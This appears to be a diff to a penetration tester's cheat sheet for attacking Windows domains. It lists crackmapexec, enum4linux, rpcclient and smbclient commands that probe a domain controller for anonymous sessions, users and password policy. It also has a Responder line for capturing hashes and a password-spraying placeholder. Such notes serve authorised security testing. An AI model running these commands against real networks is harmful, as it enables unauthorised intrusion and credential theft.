@@ -16,7 +16,7 @@
 #Using crackmap (6.0+) to enumerate online hosts
 	crackmapexec smb scope.txt --log smb-online.txt
 
-#Using crackmap to enum null/anon sessions
+#null/anon sessions
 	crackmapexec smb dc-ip -u '' -p ''
 		if works then:
 			crackmapexec smb dc-ip -u '' -p '' --users
@@ -27,6 +27,9 @@
 			crackmapexec smb dc-ip -u 'a' -p '' --pass-pol
 		also run:
 			enum4linux dc-ip
+	rpcclient -U '' dc-ip
+	smbclient -U '' -L \\\\dc-ip
+
 
 #Listen for hashes
 	responder -I eth0 -F
@@ -43,8 +46,8 @@
 
 
 
-
 #Sprays
+	spraygun
 
 
 #Got creds?
